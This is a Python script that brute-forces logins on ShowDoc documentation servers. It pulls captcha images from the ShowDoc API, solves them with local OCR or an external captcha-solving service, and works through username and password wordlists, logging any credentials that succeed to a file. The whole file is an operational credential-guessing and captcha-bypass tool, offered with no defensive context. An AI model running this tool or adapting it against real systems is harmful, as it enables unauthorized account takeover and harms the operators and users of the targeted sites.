import requests
import urllib3
import base64
import time
import sys
import argparse
import ddddocr
import os
from colorama import Fore, init
import signal

urllib3.disable_warnings()
init()

ocr = ddddocr.DdddOcr(show_ad=False)

parser = argparse.ArgumentParser()
parser.add_argument('-t', type=str, help="showdoc addr.(exp:http://showdoc.demo.com/)", default="")
parser.add_argument('-u', type=str, help="username dict.(exp:username.txt)", default="user.txt")
parser.add_argument('-p', type=str, help="password dict.(exp:password.txt)", default="pass.txt")
parser.add_argument('-c', type=str, help="captcha identify api addr", default="")
args = parser.parse_args()

running = True


def signal_handler(sig, frame):
    global running
    running = False


signal.signal(signal.SIGINT, signal_handler)


def req_header(url):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Origin': url,
        'Referer': url
    }
    return header


def check_params():
    if args.t != '':
        if os.path.exists(args.u) and os.path.getsize(args.u) != 0:
            if os.path.exists(args.p) and os.path.getsize(args.p) != 0:
                return True
            elif args.p != '':
                return True
            else:
                print(Fore.RED + '[-] Password dictionary is not specified or the content is empty!')
                sys.exit()
        elif args.u != '':
            return True
        else:
            print(Fore.RED + '[-] Username dictionary is not specified or the content is empty!')
            sys.exit()
    else:
        print(Fore.RED + '[-] No target showdoc address specified!')
        sys.exit()


def file_to_list(filename):
    res_list = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f.readlines():
            if line.strip() not in res_list:
                res_list.append(line.strip())
    return res_list


def logger(filename, string, io_type):
    with open(filename, io_type, encoding="utf-8") as f:
        f.write(string)


def handle_target(target):
    if "http:" not in str(target) and "https" not in str(target):
        target = f'http://{target}'
    return target.rstrip('/')


def showdoc_captcha_id(showdoc_url):
    captcha_id_url = f'{showdoc_url}/server/index.php?s=/api/common/createCaptcha'
    header = req_header(url=showdoc_url)
    try:
        res = requests.post(url=captcha_id_url, headers=header, verify=False, timeout=10)
        captcha_id = res.json()['data']['captcha_id']
    except:
        return 'request error'
    else:
        return captcha_id


def showdoc_captcha_base64(showdoc_url, captcha_id):
    timestamp = int(time.time() * 1000)
    captcha_url = f'{showdoc_url}/server/index.php?s=/api/common/showCaptcha&captcha_id={captcha_id}&{timestamp}'
    header = req_header(url=showdoc_url)
    try:
        res = requests.get(url=captcha_url, headers=header, verify=False, timeout=10)
        captcha_base64 = base64.b64encode(res.content).decode('utf-8')
    except:
        return 'request error'
    else:
        return captcha_base64


def showdoc_captcha_code(captcha_api, captcha_b64):
    captcha_api_url = f'{captcha_api}/reg'
    header = {
        'Authorization': 'Basic f0ngauth',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0',
        'Upgrade-Insecure-Requests': '1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    try:
        res = requests.post(url=captcha_api_url, data=captcha_b64, headers=header, verify=False, timeout=10)
        captcha_code = res.text
    except:
        return 'request error'
    else:
        return captcha_code


def showdoc_captcha_code_local(captcha_b64):
    try:
        img_bytes = base64.b64decode(captcha_b64)
        captcha_code = ocr.classification(img_bytes)[0:10]
    except:
        return 'request error'
    else:
        return captcha_code


def showdoc_login(showdoc_url, username, password, captcha_id, captcha_code):
    login_url = f'{showdoc_url}/server/index.php?s=/api/user/loginByVerify'
    header = req_header(url=showdoc_url)
    data = {
        'username': username,
        'password': password,
        'captcha': captcha_code,
        'captcha_id': captcha_id,
        'redirect_login': False
    }
    try:
        res = requests.post(url=login_url, data=data, headers=header, verify=False, timeout=10)
        login_res_code = res.json()['error_code']
        if login_res_code != 0:
            login_res_msg = res.json()['error_message']
        else:
            login_res_msg = res.json()['data']['user_token']
    except:
        return '', 'request error'
    else:
        return login_res_code, login_res_msg


def showdoc_login_main(showdoc_url, username, password, captcha_api_url):
    global running
    exit_num = 0
    exit_num_2 = 0
    while running:
        captcha_id = showdoc_captcha_id(showdoc_url)
        if captcha_id == 'request error' and exit_num != 5:
            print(Fore.RED + '\n[-] Failed to obtain verification code id!')
            logger(filename='error.log', io_type='a',
                   string=f'[{showdoc_url}/][{int(time.time())}] captcha id error!{username}:{password}\n')
            exit_num = exit_num + 1
        elif exit_num == 5:
            return '', ''
        else:
            exit_num = 0
            break
    if not running:
        return '', ''

    while running:
        while running:
            captcha_base64 = showdoc_captcha_base64(showdoc_url, captcha_id)
            if captcha_base64 == 'request error' and exit_num != 5:
                print(Fore.RED + '\n[-] Failed to obtain verification code image!')
                logger(filename='error.log', io_type='a',
                       string=f'[{showdoc_url}/][{int(time.time())}] captcha base64 error!{username}:{password}\n')
                exit_num = exit_num + 1
            elif exit_num == 5:
                return '', ''
            else:
                exit_num = 0
                break
        if not running:
            return '', ''

        while running:
            if captcha_api_url == '':
                captcha_code = showdoc_captcha_code_local(captcha_base64)
            else:
                captcha_code = showdoc_captcha_code(captcha_api_url, captcha_base64)
            if captcha_code == 'request error' and exit_num != 5:
                print(Fore.RED + '\n[-] Verification code decoding failed!')
                logger(filename='error.log', io_type='a',
                       string=f'[{showdoc_url}/][{int(time.time())}] captcha code error!{username}:{password}\n')
                exit_num = exit_num + 1
            elif exit_num == 5:
                return '', ''
            else:
                exit_num = 0
                break
        if not running:
            return '', ''

        print(Fore.WHITE + f'[*] Verification code:{captcha_code}')
        login_res_code, login_res_msg = showdoc_login(showdoc_url, username, password, captcha_id, captcha_code)
        if login_res_msg == '\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e' and exit_num_2 != 10:
            exit_num_2 = exit_num_2 + 1
        elif login_res_msg == 'request error' and exit_num_2 != 10:
            exit_num_2 = exit_num_2 + 1
        elif exit_num_2 == 10:
            return '', ''
        else:
            return login_res_code, login_res_msg


def run():
    global running
    if check_params():
        showdoc_url = handle_target(target=args.t)
        if args.c != '':
            captcha_api_url = handle_target(target=args.c)
        else:
            captcha_api_url = ''
        if os.path.exists(args.u) and os.path.exists(args.p):
            user_list = file_to_list(filename=args.u)
            pass_list = file_to_list(filename=args.p)
            user_total = len(user_list)
            pass_total = len(pass_list)
            total = user_total * pass_total
            print(Fore.WHITE + f'[+] Read the total number of usernames:', end='')
            print(Fore.GREEN + f'{user_total}')
            print(Fore.WHITE + f'[+] Read the total number of passwords:', end='')
            print(Fore.GREEN + f'{pass_total}')
            for u_index, username in enumerate(user_list):
                if not running:
                    break
                for p_index, password in enumerate(pass_list):
                    if not running:
                        break
                    progress = round((((u_index * pass_total) + p_index + 1) * 100) / total, 2)
                    print(Fore.WHITE + f'[{progress}%] Try to log in:{username}/{password}')
                    login_res_code, login_res_msg = showdoc_login_main(showdoc_url, username, password, captcha_api_url)
                    if login_res_code == 0:
                        print(Fore.WHITE + '[*] Login successful! username:', end='')
                        print(Fore.GREEN + f'{username}', end='')
                        print(Fore.WHITE + ' password:', end='')
                        print(Fore.GREEN + f'{password}')
                        logger(filename='login_success.txt', io_type='a',
                               string=f'[{showdoc_url}/] {username}/{password}\n')
                        break
        elif not os.path.exists(args.u) and os.path.exists(args.p):
            username = args.u
            pass_list = file_to_list(filename=args.p)
            pass_total = len(pass_list)
            print(Fore.WHITE + f'[+] Username:', end='')
            print(Fore.GREEN + f'{username}')
            print(Fore.WHITE + f'[+] Read the total number of passwords:', end='')
            print(Fore.GREEN + f'{pass_total}')
            for p_index, password in enumerate(pass_list):
                if not running:
                    break
                progress = round(((p_index + 1) * 100) / pass_total, 2)
                print(Fore.WHITE + f'[{progress}%] Try to log in:{username}/{password}')
                login_res_code, login_res_msg = showdoc_login_main(showdoc_url, username, password, captcha_api_url)
                if login_res_code == 0:
                    print(Fore.WHITE + '[*] Login successful! username:', end='')
                    print(Fore.GREEN + f'{username}', end='')
                    print(Fore.WHITE + ' password:', end='')
                    print(Fore.GREEN + f'{password}')
                    logger(filename='login_success.txt', io_type='a',
                           string=f'[{showdoc_url}/] {username}/{password}\n')
                    break
        elif os.path.exists(args.u) and not os.path.exists(args.p):
            user_list = file_to_list(filename=args.u)
            password = args.p
            user_total = len(user_list)
            print(Fore.WHITE + f'[+] Read the total number of usernames:', end='')
            print(Fore.GREEN + f'{user_total}')
            print(Fore.WHITE + f'[+] Password:', end='')
            print(Fore.GREEN + f'{password}')
            for u_index, username in enumerate(user_list):
                if not running:
                    break
                progress = round(((u_index + 1) * 100) / user_total, 2)
                print(Fore.WHITE + f'[{progress}%] Try to log in:{username}/{password}')
                login_res_code, login_res_msg = showdoc_login_main(showdoc_url, username, password, captcha_api_url)
                if login_res_code == 0:
                    print(Fore.WHITE + '[*] Login successful! username:', end='')
                    print(Fore.GREEN + f'{username}', end='')
                    print(Fore.WHITE + ' password:', end='')
                    print(Fore.GREEN + f'{password}')
                    logger(filename='login_success.txt', io_type='a',
                           string=f'[{showdoc_url}/] {username}/{password}\n')
        else:
            username = args.u
            password = args.p
            print(Fore.WHITE + f'[+] Username:', end='')
            print(Fore.GREEN + f'{username}')
            print(Fore.WHITE + f'[+] Password:', end='')
            print(Fore.GREEN + f'{password}')
            print(Fore.WHITE + f'[+] Try to log in:{username}/{password}')
            login_res_code, login_res_msg = showdoc_login_main(showdoc_url, username, password, captcha_api_url)
            if login_res_code == 0:
                print(Fore.WHITE + '[*] Login successful! username:', end='')
                print(Fore.GREEN + f'{username}', end='')
                print(Fore.WHITE + ' password:', end='')
                print(Fore.GREEN + f'{password}')
                logger(filename='login_success.txt', io_type='a', string=f'[{showdoc_url}/] {username}/{password}\n')


if __name__ == '__main__':
    try:
        run()
    except KeyboardInterrupt:
        print(Fore.RED + '[-] User actively logs out!')
        sys.exit()
    finally:
        if not running:
            print(Fore.RED + '[-] User actively logs out!')
            sys.exit(0)

